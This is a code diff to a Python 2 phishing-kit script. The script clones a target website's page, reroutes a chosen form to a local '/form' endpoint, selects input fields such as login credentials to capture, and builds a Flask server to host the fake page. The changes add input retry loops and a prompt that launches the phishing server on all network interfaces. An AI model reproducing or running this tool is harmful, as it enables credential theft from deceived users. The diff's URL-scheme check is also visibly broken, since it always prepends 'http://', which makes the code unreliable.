@@ -65,21 +65,34 @@ def edit_page(filename):
     for f in forms:
         print "FORM " + str(i) + " --> " +  f.get('action', 'None')
         i += 1
-    i = int(raw_input('Form to log: '))
-    f = forms[i]
+    while True:
+        try:
+            i = int(raw_input('Form to log: '))
+        except ValueError:
+            print "Enter the form number"
+        try:
+            f = forms[i]
+            break
+        except IndexError:
+            print "Invalid form number"
     print "Selected form " + str(i) + '\n'
     f['action'] = "/form"
     loggable = []
     for i in  f.find_all('input'):
         if i.get('name'):
             loggable.append(i['name'])
-    print "[*] Form fields:"
-    for i in range(len(loggable)):
-        print str(i) + " - " + loggable[i]
-    input_params = raw_input('Fields to log (space separated): ').split(' ')
-    to_log = []
-    for i in input_params:
-        to_log.append(loggable[int(i)])
+    while True:
+        print "[*] Form fields:"
+        for i in range(len(loggable)):
+            print str(i) + " - " + loggable[i]
+        input_params = raw_input('Fields to log (comma separated, e.g 1,4,5): ').split(',')
+        to_log = []
+        try:
+            for i in input_params:
+                to_log.append(loggable[int(i)])
+            break
+        except:
+            print "Invalid format: use form field identifiers (e.g 1,4,5)"
     print 'Logging: ' + str(to_log) + '\n'
     with open('index.html', "w") as f:
         f.write(soup.encode_contents())
@@ -96,6 +109,8 @@ def generate_phisher(to_log, url):
 
 def main(args):
     url = args.url
+    if not url.startswith('http://') or not url.startswith('https://'):
+        url = 'http://' + url
     download_page(url, 'page.html')
     to_log = edit_page('page.html')
     os.remove('page.html')
@@ -107,8 +122,9 @@ def main(args):
     shutil.move('app.py', output_dir)
     shutil.move('index.html', output_dir + '/templates')
     print "[*] Phishing page ready !"
-    print 'cd ' + output_dir + ' && python app.py runserver to get started'
-
+    runnow = raw_input("Run now ? (y/n)")
+    if runnow == 'y':
+        os.system("python app/app.py runserver -h 0.0.0.0 -p 8000 --threaded")
 
 if __name__ == '__main__':
     from argparse import ArgumentParser
